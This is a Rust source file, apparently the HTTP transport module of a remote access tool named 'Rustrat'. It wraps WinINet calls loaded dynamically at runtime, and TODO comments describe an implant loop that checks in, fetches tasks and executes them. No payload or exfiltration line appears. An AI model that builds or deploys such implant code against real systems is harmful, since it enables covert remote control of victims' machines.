// TODO: Initial state -> generate public key -> checkin -> regenerate public key if failed, otherwise continue -> fetch task -> execute task
// TODO wrappers, open HINTERNET handles when creating structs, calling InternetCloseHandle on destruction
// TODO remember error handling, functions may fail to connect

mod error;

use crate::ffi::{FfiType, FnTable, GetLastError, Win32FfiTypes};

use libffi::middle::arg;
use std::ffi::CString;
use std::os::raw::c_void;
use std::ptr;

struct InternetHandle<'a> {
    // TODO Arc<RwLock<FnTable>> instead of 'a?
    fn_table: &'a FnTable,
    handle: *mut c_void,
}

struct InternetUrlHandle<'a> {
    fn_table: &'a FnTable,
    handle: *mut c_void,
    // TODO is this neccessary? I believe we want to close the handle to this before InternetHandle's
    _internet_handle: &'a InternetHandle<'a>,
}

bitflags! {
    struct InternetUrlFlags: u32 {
        const INTERNET_FLAG_HYPERLINK = 0x400;
        const INTERNET_FLAG_IGNORE_CERT_CN_INVALID = 0x1000;
        const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID = 0x2000;
        const INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP = 0x8000;
        const INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS = 0x4000;
        const INTERNET_FLAG_KEEP_CONNECTION = 0x400000;
        const INTERNET_FLAG_NEED_FILE = 0x10;
        const INTERNET_FLAG_NO_AUTH = 0x40000;
        const INTERNET_FLAG_NO_AUTO_REDIRECT = 0x200000;
        const INTERNET_FLAG_NO_CACHE_WRITE = 0x4000000;
        const INTERNET_FLAG_NO_COOKIES = 0x80000;
        const INTERNET_FLAG_NO_UI = 0x200;
        const INTERNET_FLAG_PRAGMA_NOCACHE = 0x100;
        const INTERNET_FLAG_RELOAD = 0x80000000;
        const INTERNET_FLAG_RESYNCHRONIZE = 0x800;
        const INTERNET_FLAG_SECURE = 0x800000;
    }
}

impl<'a> InternetHandle<'a> {
    // TODO possibly allow to set proxy setting/configure to only use direct connection
    pub fn create(fn_table: &'a FnTable, ua_string: CString) -> error::Result<Self> {
        let handle: *mut c_void;

        unsafe {
            handle = fn_table.call_fn::<*mut c_void>(
                "InternetOpenA".to_string(),
                &[
                    arg(&ua_string.as_ptr()),
                    arg(&0u32), //INTERNET_OPEN_TYPE_PRECONFIG
                    arg(&ptr::null::<c_void>()),
                    arg(&ptr::null::<c_void>()),
                    arg(&0u32), //No flags, synchronous request
                ],
            )?;

            if handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(InternetHandle { fn_table, handle })
    }

    pub fn create_url_handle(
        &self,
        url: CString,
        headers: Option<CString>,
        flags: InternetUrlFlags,
    ) -> error::Result<InternetUrlHandle> {
        let handle: *mut c_void;
        let headers_ptr = match headers {
            Some(header_string) => header_string.as_ptr() as *const c_void,
            None => ptr::null::<c_void>(),
        };

        unsafe {
            handle = self.fn_table.call_fn(
                "InternetOpenUrlA".to_string(),
                &[
                    arg(&self.handle),
                    arg(&url.as_ptr()),
                    arg(&headers_ptr),
                    arg(&-1i32),
                    arg(&flags.bits()),
                    arg(&ptr::null::<c_void>()),
                ],
            )?;

            if handle.is_null() {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(InternetUrlHandle {
            fn_table: self.fn_table,
            handle: handle,
            _internet_handle: self,
        })
    }
}

impl<'a> InternetUrlHandle<'a> {
    // TODO function read headers

    pub fn get_response(&mut self) -> error::Result<Vec<u8>> {
        let chunk_size = 0xffff;
        let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
        let mut total_bytes_written: u32 = 0;
        let mut bytes_written: u32 = 0;

        unsafe {
            //is_error is a boolean, 0 = false
            let mut is_error: i32 = self.fn_table.call_fn(
                "InternetReadFile".to_string(),
                &[
                    arg(&self.handle),
                    arg(&out.as_mut_ptr()),
                    arg(&(out.capacity() as u32 - total_bytes_written)),
                    arg(&(&mut bytes_written as *mut u32)),
                ],
            )?;

            while is_error != 0 && bytes_written != 0 {
                total_bytes_written += bytes_written;
                bytes_written = 0;

                out.set_len(total_bytes_written as usize);
                out.reserve(chunk_size);

                is_error = self.fn_table.call_fn(
                    "InternetReadFile".to_string(),
                    &[
                        arg(&self.handle),
                        arg(&(&out[total_bytes_written as usize..].as_mut_ptr())),
                        arg(&(out.capacity() as u32 - total_bytes_written)),
                        arg(&(&mut bytes_written as *mut u32)),
                    ],
                )?;
            }

            if is_error == 0 {
                return Err(error::Error::WinApiError(GetLastError()));
            }
        }

        Ok(out)
    }
}

impl<'a> Drop for InternetHandle<'a> {
    fn drop(&mut self) {
        unsafe {
            let _ = self
                .fn_table
                .call_fn::<u32>("InternetCloseHandle".to_string(), &[arg(&self.handle)]);
        }
    }
}

impl<'a> Drop for InternetUrlHandle<'a> {
    fn drop(&mut self) {
        unsafe {
            let _ = self
                .fn_table
                .call_fn::<u32>("InternetCloseHandle".to_string(), &[arg(&self.handle)]);
        }
    }
}

fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
    fn_table.register_fn(
        "InternetOpenA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetOpenUrlA".to_string(),
        "Wininet.dll".to_string(),
        FfiType::POINTER as i32,
        &[
            FfiType::POINTER as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::LPCSTR as i32,
            Win32FfiTypes::DWORD as i32,
            Win32FfiTypes::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetReadFile".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[
            FfiType::POINTER as i32,
            FfiType::POINTER as i32,
            Win32FfiTypes::DWORD as i32,
            FfiType::POINTER as i32,
        ],
    )?;

    fn_table.register_fn(
        "InternetCloseHandle".to_string(),
        "Wininet.dll".to_string(),
        FfiType::UINT32 as i32,
        &[FfiType::POINTER as i32],
    )?;

    Ok(())
}

pub fn do_http_get(url: String) -> error::Result<Vec<u8>> {
    let mut fn_table = FnTable::new();
    register_wininet_fns(&mut fn_table)?;

    let ua = CString::new("Rustrat").unwrap();
    let url = CString::new(url).unwrap();

    let internet_handle = InternetHandle::create(&fn_table, ua).unwrap();
    let mut url_handle = internet_handle
        .create_url_handle(
            url,
            None,
            InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
                | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
                | InternetUrlFlags::INTERNET_FLAG_PRAGMA_NOCACHE
                | InternetUrlFlags::INTERNET_FLAG_RELOAD,
        )
        .unwrap();

    Ok(url_handle.get_response().unwrap())
}
